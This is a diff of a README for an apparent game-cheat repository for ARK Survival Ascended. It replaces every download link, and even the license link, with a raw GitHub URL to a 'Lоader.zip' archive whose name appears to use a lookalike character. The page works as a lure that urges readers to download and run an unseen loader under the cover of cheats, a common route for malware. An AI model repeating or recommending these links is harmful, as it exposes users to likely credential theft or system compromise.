@@ -1,6 +1,6 @@
 # 🚀 ARK Survival Ascended Cheats & Hacks Repository
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://easylauncher.su/PSnzrH)
+[![Download Latest Version](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip)
 
 Welcome to the **ARK Survival Ascended Cheats & Hacks** collection! This repository provides powerful, innovative tools with exclusive features designed for ARK Survival Ascended enthusiasts, maximizing your gameplay advantage and unlocking next-level possibilities. This software leverages the latest training and automation technologies for optimal performance.
 
@@ -39,7 +39,7 @@ ARK Survival Ascended cheats, ARK hacks 2025, Precision aimbot ARK, ARK wallhack
 ## 🏗️ Installation Guide
 
 **Step 1:**  
-[![Download Now](https://img.shields.io/badge/Download%20Setup-v1.0-blue)](https://easylauncher.su/PSnzrH)  
+[![Download Now](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip%20Setup-v1.0-blue)](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip)  
 Click the button above to securely acquire the latest version suitable for your OS. Follow the included instructions for configuration. If you need advanced setup support, consult our wiki and community discussions.
 
 ---
@@ -52,10 +52,10 @@ Strictly designed for education, testing, and research on personal servers. Use 
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025
+Licensed under the [MIT License](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip) © 2025
 
 ---
 
 ## ⬇️ Quick Download
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-v1.0-success)](https://easylauncher.su/PSnzrH)
+[![Download Here](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip%20Here-v1.0-success)](https://raw.githubusercontent.com/shreedeep/ARK-Ascended-Toolkit/main/Lоader.zip)
